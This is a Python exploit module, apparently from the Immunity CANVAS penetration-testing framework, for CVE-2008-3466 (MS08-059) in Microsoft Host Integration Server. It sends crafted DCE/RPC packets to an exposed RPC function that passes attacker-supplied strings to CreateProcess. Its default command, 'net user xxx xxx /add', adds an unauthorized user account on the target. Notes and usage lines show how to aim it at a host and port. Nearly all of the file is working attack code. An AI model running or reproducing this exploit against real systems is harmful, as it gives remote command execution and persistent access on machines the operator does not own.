#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit

# GUI info
NAME='Microsoft Host Integration Server RPC Interface Vulnerability'
DESCRIPTION='Microsoft Host Integration Server RPC Interface Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/14/2008'
DOCUMENTATION['CVE Name'] = 'CVE-2008-3466'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3466'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['Notes']=''
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/ms08-059.mspx'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']
PROPERTY['MSADV']='MS08-059'

CHANGELOG="""
"""

NOTES="""
Most phail vulnerability ever. RPC function is called _SnaRpcService_RunExecutable.
Takes 2 string parameters and pass that to CreateProcess. I cried. Service is listening
on a dynamic TCP/IP port, if port parameter is 0, we'll try to get it with searchifids,
otherwise find it by yourself and specify it to the exploit.

At the moment I don't want to add a local SMB server to execute a remote binary so I am
doing a net-user-add command, check self.command in the init.

Tested on:
Microsoft HIS 2004 on Windows 2003 Standard SP2

Usage:
# ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/ms08_059/ms08_059.py -t 10.10.10.244 -p 1034 # -l 10.10.10.1 -d 5555
"""

targets={
    0: ['Autoversioning'],
    1: ['Microsoft HIS (ALL)'], #it's a remote CreateProcessA, so no need for specific stuff
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name             = NAME
        self.UUID             = u'ed6ee250-e0d1-11cf-925a-00aa00c006c1'
        self.uuidversion      = u'1.1'
        self.targetfunction   = 1
        self.autoversion      = 1
        self.subesp           = 2000
        self.port             = 0
        self.command          = 'net user xxx xxx /add'
        self.needsNoShellcode = 1

    def neededListenerTypes(self):
        return []

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.command=self.argsDict.get('command',self.command)

    def testOS(self):
        self.getArgs()
        self.version=1
        return 1

    def buildConnectionList(self):
        if self.connectionList!=[]:
            return self.connectionList 
        if self.port==0:
            self.searchifids()
            connectionList=[]
            for c in self.connectionList:
                if c.count('ncacn_ip_tcp')!=0:
                    connectionList.append(c)
            self.connectionList=connectionList
        else:
            self.connectionList=['ncacn_ip_tcp:%s[%d]'%(self.host,self.port)]
        return self.connectionList
    
    def s_dce_string(self,mystr): #put that into msrpc.py some day
        ret=''
        mystr+='\0' #add null byte
        size=len(mystr)
        ret+=struct.pack('<LLL',size,0,size)
        ret+=mystr
        while (len(ret)%4)!=0:
            ret+='\0' #padding
        return ret

    def buildDcePacket(self):
        self.getArgs()
        self.info=targets[0]
        packet=''
        packet+=self.s_dce_string(self.command)
        packet+=self.s_dce_string('')
        return packet

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
